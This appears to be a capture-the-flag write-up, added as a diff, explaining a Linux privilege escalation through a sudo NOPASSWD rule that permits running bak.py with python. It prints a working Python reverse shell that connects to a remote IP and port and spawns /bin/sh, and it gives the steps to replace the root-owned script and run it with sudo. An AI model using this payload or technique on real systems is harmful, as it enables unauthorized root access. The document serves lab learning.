@@ -1,0 +1,51 @@
+Clues I have:
+```
+meliodas@ubuntu:~$ sudo -l
+Matching Defaults entries for meliodas on ubuntu:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User meliodas may run the following commands on ubuntu:
+    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
+```
+
+```
+meliodas@ubuntu:~$ ls -la
+total 44
+drwxr-xr-x 5 meliodas meliodas 4096 Sep 20 12:21 .
+drwxr-xr-x 3 root     root     4096 Aug 23  2019 ..
+-rw-rw-r-- 1 root     root      353 Sep 20 12:21 bak.py
+-rw------- 1 root     root       44 Aug 23  2019 .bash_history
+-rw-r--r-- 1 meliodas meliodas  220 Aug 23  2019 .bash_logout
+-rw-r--r-- 1 meliodas meliodas 3771 Aug 23  2019 .bashrc
+drwx------ 2 meliodas meliodas 4096 Aug 23  2019 .cache
+drwx------ 2 meliodas meliodas 4096 Sep 20 11:21 .gnupg
+drwxrwxr-x 2 meliodas meliodas 4096 Aug 23  2019 .nano
+-rw-r--r-- 1 meliodas meliodas  655 Aug 23  2019 .profile
+-rw-r--r-- 1 meliodas meliodas    0 Aug 23  2019 .sudo_as_admin_successful
+-rw-rw-r-- 1 meliodas meliodas   33 Aug 23  2019 user.txt
+```
+```
+bak.py file
+---------------------------------------
+export RHOST=10.10.64.132
+export RPORT=12345
+python -c 'import sys,socket,os,pty;s=socket.socket()
+s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+pty.spawn("/bin/sh")'
+```
+
+The Solution  ---------->>>>>>>>>>>>>>>>>>>>>>>>
+After getting access of the account(meliodas aka me)
+1. I got to know by sudo -l command that i can execute bak.py file
+2. but when i saw the permission of the file i saw that the user of the file is 'root'
+-rw-rw-r-- 1 root     root      353 Sep 20 12:21 bak.py
+3. so i deleted the file and reconstructed it with the same name 'bak.py' (now i am the user).
+-rw-rw-r-- 1 meliodas     meliodas      353 Sep 20 12:21 bak.py
+4. this time i changed the contents of this file and replaced it with a shell which breaks out of the restricted environment of linux. If ran with proper permission (i.e. sudo)
+5. then `sudo -l` says i can run a particular file and no password will be needed
+(ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
+NOTE: the file path is mentioned. Hence if i simply run `sudo python bak.py` then it won't work because 
+-> my sudoers entry allows meliodas(me) to execute /usr/bin/python* and specifically allows the script located at /home/meliodas/bak.py
+-> so just simply executing `sudo python bak.py` won't work(cause its a relative path)
+-> i'd have to use `sudo python /home/meliodas/bak.py`(cause its an absolute path)
